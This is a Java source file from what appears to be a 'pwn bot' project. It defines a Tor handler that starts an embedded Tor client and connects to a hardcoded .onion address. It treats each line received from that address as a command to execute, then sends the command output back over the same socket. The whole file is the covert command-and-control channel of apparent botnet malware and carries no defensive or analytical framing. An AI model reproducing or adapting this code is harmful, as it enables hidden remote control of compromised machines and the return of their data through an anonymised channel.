package com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.tor.handler;

import com.github.kvac.pwn.kvacpwnroot.kvac.pwn.libs.events.ControlEvent;
import com.github.kvac.pwn.kvacpwnroot.kvac.pwn.libs.events.command.CommandEvent;
import com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.commands.header.CommonHeader;
import com.google.common.eventbus.Subscribe;
import com.subgraph.orchid.TorClient;
import com.subgraph.orchid.TorInitializationListener;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class TorHandler implements TorInitializationListener {

    Logger logger = LoggerFactory.getLogger(getClass());

    TorClient torClient;
    private PrintWriter writer;
    private BufferedReader reader;

    public void register() {

        logger.info("register");
        CommonHeader.getEVENT_HEADER().getTorEventBus().register(this);
        logger.info("register-ok");
    }

    //FIXME
    @Subscribe
    void controlEventPoint(ControlEvent event) {
        ControlEvent controlEvent = (ControlEvent) event;
        ControlEvent.CONTROL_TYPE type = controlEvent.getType();
        logger.warn(type.toString());
        switch (type) {
            case INIT:
                init();
                break;
            case START:
                    try {
                start();
            } catch (Exception e) {
                logger.error("", e);
            }
            break;
            default:
                logger.warn("TorHandler:type:else");
                break;
        }

    }

    private void init() {
        logger.info("TorHandler-controlEventPoint-init");
        this.torClient = new TorClient();
        torClient.addInitializationListener(this);
        logger.info("TorHandler-controlEventPoint-init-ok");
    }

    private void start() {
        logger.info("TorHandler-controlEventPoint-start");
        torClient.start();
        logger.info("TorHandler-controlEventPoint-start-ok");
    }

    @Override
    public void initializationProgress(String string, int i) {
        logger.info("[" + i + "] " + " MSG:" + string);
    }

    @Override
    public void initializationCompleted() {
        logger.info("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$");
        //FIXME
        //TODO CONNECT
        try {
            Socket socket = torClient.getSocketFactory().createSocket("pbc6urv4bakvxkjs.onion", 8000);
            this.writer = new PrintWriter(socket.getOutputStream(), true);
            this.reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            writer.println("GET /");
            String line;
            logger.info("testOrchidUsingSocket: ");
            while ((line = reader.readLine()) != null) {
                logger.info(line);
                CommandEvent commandEvent = new CommandEvent();
                commandEvent.setCommand(line);
                CommonHeader.getEVENT_HEADER().getCommandEventBus().post(commandEvent);
            }
            socket.close();
        } catch (Exception ex) {
            logger.error(null, ex);
        }
    }

    @Subscribe
    void sendOutPutFromCommand(CommandEvent event) {
        String output = event.getOutput();
        writer.println(output);
        writer.flush();
    }
}
